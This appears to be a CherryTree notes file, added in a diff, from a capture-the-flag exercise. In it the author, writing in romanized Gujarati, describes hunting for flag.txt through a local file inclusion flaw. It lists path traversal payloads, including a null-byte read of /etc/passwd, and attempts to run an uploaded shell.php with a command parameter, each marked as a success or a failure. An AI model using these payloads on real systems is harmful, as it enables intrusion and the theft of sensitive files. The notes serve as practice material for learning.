@@ -1,0 +1,27 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="32" master_id="0" name="Payloads" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1751724448" ts_lastsave="1751725242">
+    <rich_text>mai ghani try kari ke hu command ne run karu url thi ema pan hu usr na badha bin ne read kari sakto hato pn mane koi upay na malyo lagbhag kato hu goti na sakyo joye kadach mane agal aa vastu ma koi vastu na male 
+ema pan mai try kari ke hu flag.txt ne gotu pn flag.txt to sidhaj folder ma hati ane hu akha file system ma gotva mandelo ke mane flag mali jaay pn flag to ahiya j hato 
+mai jetli try kari ee niche chhe aaa hasy vali vaat chhe pan flag tyaj hato local directory ma 
+
+
+ha ana thi mane eno to idea ayo ke hu kevi rite lfi ne bypass kari saku 
+
+ane ha mai ee vastu pan try kari ke php file auto genrate thati hoi to hu en block karu pan hu bhuli gayo hato ke hu to sidho sidh aa vastu ne read kari sakto hato 
+
+</rich_text>
+    <rich_text link="webs http://site.com/index.php?language=languages//..//..//..//etc//passwd%00" weight="heavy">http://site.com/index.php?language=languages//..//..//..//etc//passwd%00</rich_text>
+    <rich_text weight="heavy"> </rich_text>
+    <rich_text>				try hati pan check karva ma su jatu hatu
+</rich_text>
+    <codebox char_offset="481" justification="left" frame_width="607" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">http://site.com/index.php?language=uploads/shell.php&amp;cmd=whoami				fail
+http://site.com/index.php?language=uploads/shell.php&amp;cmd=whoami				fail
+http://site.com/index.php?language=languages//..//..//..//etc//passwd				succed
+http://site.com/index.php?language=languages//..//..//..//usr/bin/bash				fail
+http://site.com/index.php?language=languages//..//..//..//usr/bin/ls					fail
+http://site.com/index.php?language=languages//..//..//..//usr/bin/id					fail
+http://site.com/index.php?language=languages//..//..//..//usr/bin/whoami		fail
+http://site.com/index.php?language=languages//..//..//..//flag.txt						succed</codebox>
+  </node>
+</cherrytree>
